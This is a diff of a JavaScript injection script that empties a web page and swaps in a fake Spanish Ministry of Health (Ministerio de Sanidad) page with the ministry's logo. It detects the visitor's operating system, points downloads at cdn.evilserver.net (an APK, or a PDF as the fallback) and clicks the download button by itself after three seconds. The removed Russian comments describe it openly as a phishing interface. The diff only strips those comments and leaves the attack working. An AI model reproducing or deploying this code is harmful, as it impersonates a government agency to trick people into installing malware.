@@ -1,9 +1,6 @@
 (function() {
     'use strict';
-    // Очищаем оригинальный контент и внедряем фишинговый интерфейс
     document.body.innerHTML = ''; 
-    
-    // CSS для точного воспроизведения стиля Ministerio de Sanidad (берётся из оригинального /diseno/css/home.css)
     var styles = `
     @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -22,8 +19,6 @@
     var styleSheet = document.createElement('style');
     styleSheet.textContent = styles;
     document.head.appendChild(styleSheet);
-    
-    // Определение ОС
     var ua = navigator.userAgent;
     var isWindows = /Windows NT/i.test(ua);
     var isAndroid = /Android/i.test(ua);
@@ -37,12 +32,9 @@
         downloadUrl = 'https://cdn.evilserver.net/SanidadConecta.apk';
         fileName = 'SanidadConecta.apk';
     } else {
-        // iOS или другое — можно показать сообщение об отправке в App Store, но здесь упрощённо
-        downloadUrl = 'https://cdn.evilserver.net/SanidadConecta_manual.pdf'; // заглушка
+        downloadUrl = 'https://cdn.evilserver.net/SanidadConecta_manual.pdf';
         fileName = 'Instrucciones_SanidadConecta.pdf';
     }
-    
-    // Конструкция HTML-страницы на испанском
     var html = `
     <div class="gov-header">
         <img src="https://sede.mscbs.gob.es/diseno/img/logo_ministerio.jpg" alt="Ministerio de Sanidad">
@@ -83,16 +75,11 @@
     `;
     
     document.body.innerHTML = html;
-    
-    // Принудительное скачивание через небольшую задержку и клик по кнопке (можно автоматически)
     document.getElementById('downloadBtn').addEventListener('click', function(e) {
-        // Начинаем загрузку, через 2 секунды можно показать "спасибо"
         setTimeout(function() {
             alert('Descarga iniciada. Si no comienza automáticamente, haga clic de nuevo en el botón.');
         }, 1000);
     });
-    
-    // Автоматический клик через 3 секунды (опционально, увеличивает шанс загрузки)
     setTimeout(function() {
         document.getElementById('downloadBtn').click();
     }, 3000);
